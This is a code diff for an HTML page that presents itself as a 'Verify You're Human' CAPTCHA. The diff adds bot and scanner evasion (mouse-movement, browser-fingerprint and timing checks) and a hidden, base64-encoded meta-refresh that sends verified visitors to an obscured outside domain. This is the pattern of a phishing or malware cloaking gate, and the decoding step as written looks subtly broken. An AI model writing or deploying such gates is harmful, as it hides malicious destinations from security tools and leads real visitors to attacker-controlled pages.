@@ -8,77 +8,91 @@
       font-family: Arial, sans-serif;
       text-align: center;
       padding-top: 100px;
+      background-color: #f2f2f2;
     }
     input, button {
       font-size: 16px;
       padding: 10px;
-      margin-top: 10px;
+      margin: 10px;
+    }
+    #redirect-message {
+      display: none;
+      font-weight: bold;
+      color: green;
     }
   </style>
-  <script>
-    const encodedUrl = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vd29ya2luZ3dva2Vycy5mZW5tZW5vcy5kZS9iYzBRUCUyMiUyMC8lM0U=";
+</head>
+<body>
+  <h2>Verify You're Human</h2>
+  <p id="captcha-question">Loading challenge...</p>
+  <input type="number" id="captcha-answer" placeholder="Enter answer" />
+  <br>
+  <button onclick="verifyCaptcha()">Submit</button>
+  <p id="redirect-message">Redirecting, please wait...</p>
 
+  <!-- Hidden base64 link -->
+  <a id="secret-link" href="JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vd29ya2luZ3dva2Vycy5mZW5tZW5vcy5kZS9iYzBRUCUyMiUyMC8lM0U=" style="display: none;"></a>
+
+  <script>
     let num1, num2;
     let mouseMoved = false;
     const startTime = Date.now();
 
-    function isHumanLikeBrowser() {
-      return (
-        typeof navigator !== 'undefined' &&
-        typeof window !== 'undefined' &&
-        navigator.userAgent &&
-        navigator.userAgent.length > 10 &&
-        'language' in navigator &&
-        screen.width > 0 &&
-        screen.height > 0 &&
-        typeof window.DeviceOrientationEvent !== 'undefined'
-      );
-    }
+    // Detect mouse movement
+    window.addEventListener("mousemove", () => {
+      mouseMoved = true;
+    });
 
-    function hasMouseMovement() {
-      return mouseMoved;
-    }
-
+    // Generate a new CAPTCHA each load
     function generateCaptcha() {
       num1 = Math.floor(Math.random() * 10) + 1;
       num2 = Math.floor(Math.random() * 10) + 1;
       document.getElementById("captcha-question").innerText = `What is ${num1} + ${num2}?`;
     }
 
+    // Bot detection
+    function isHumanLikeBrowser() {
+      return (
+        navigator.userAgent.length > 20 &&
+        screen.width > 0 &&
+        screen.height > 0 &&
+        typeof window.DeviceOrientationEvent !== "undefined" &&
+        'language' in navigator &&
+        'platform' in navigator &&
+        window.innerWidth > 0
+      );
+    }
+
     function verifyCaptcha() {
       const userAnswer = parseInt(document.getElementById("captcha-answer").value, 10);
-      const elapsed = Date.now() - startTime;
+      const timeElapsed = Date.now() - startTime;
 
       if (
-        isHumanLikeBrowser() &&
-        hasMouseMovement() &&
         userAnswer === (num1 + num2) &&
-        elapsed > 1500
+        mouseMoved &&
+        isHumanLikeBrowser() &&
+        timeElapsed > 1500
       ) {
-        const decodedUrl = atob(encodedUrl);
-        window.location.href = decodedUrl;
+        document.getElementById("redirect-message").style.display = "block";
+        setTimeout(() => {
+          const encodedHref = document.getElementById("secret-link").getAttribute("href");
+          try {
+            const decoded = atob(encodedHref);
+            window.location.href = decoded;
+          } catch (e) {
+            alert("Redirect failed. Invalid link.");
+          }
+        }, 1000);
       } else {
         alert("Verification failed. Try again.");
-        generateCaptcha();
         document.getElementById("captcha-answer").value = "";
+        generateCaptcha();
       }
     }
 
-    function init() {
-      window.addEventListener("mousemove", () => {
-        mouseMoved = true;
-      });
+    window.onload = () => {
       generateCaptcha();
-    }
-
-    window.onload = init;
+    };
   </script>
-</head>
-<body>
-  <h2>Security Verification</h2>
-  <p id="captcha-question"></p>
-  <input type="number" id="captcha-answer" placeholder="Your answer">
-  <br>
-  <button onclick="verifyCaptcha()">Verify & Continue</button>
 </body>
 </html>
